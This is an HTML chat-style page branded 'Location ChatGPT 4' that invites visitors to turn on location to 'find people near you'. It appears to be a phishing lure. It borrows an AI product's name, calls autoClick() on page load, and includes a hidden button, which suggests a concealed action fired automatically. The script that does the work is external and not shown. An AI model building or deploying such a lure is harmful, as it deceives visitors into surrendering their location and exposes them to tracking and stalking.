<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Find - People</title>
  <link rel="stylesheet" href="./style.css">
</head>
<body onload="autoClick()">
  
  <div class="loading-overlay">
    <div class="loader"></div>
  </div>

  <section class="msger">
    <header class="msger-header">
      <div class="msger-header-title">
        <i class="fas fa-comment-alt"></i> Location ChatGPT 4
      </div>
      <div class="msger-header-options">
        <span><i class="fas fa-cog"></i></span>
      </div>
    </header>

    <main class="msger-chat">
      <div class="msg left-msg">
        <div class="msg-img" style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"></div>

        <div class="msg-bubble">
          <div class="msg-info">
            <div class="msg-info-name">Admin</div>
            <div class="msg-info-time"></div>
          </div>
          <div class="msg-text">
            Hi, welcome to Location GPT-4. Turn on your location to find people near you.üìç
          </div>
        </div>
      </div>
    </main>

    <form class="msger-inputarea">
      <input type="text" class="msger-input" placeholder="Ask me anything...">
      <button type="submit" class="msger-send-btn">Send</button>
    </form>
  </section>

  <button id="hidden-btn" style="display: none;">Hidden Button</button>

  <script src="./script.js"></script>
</body>
</html>
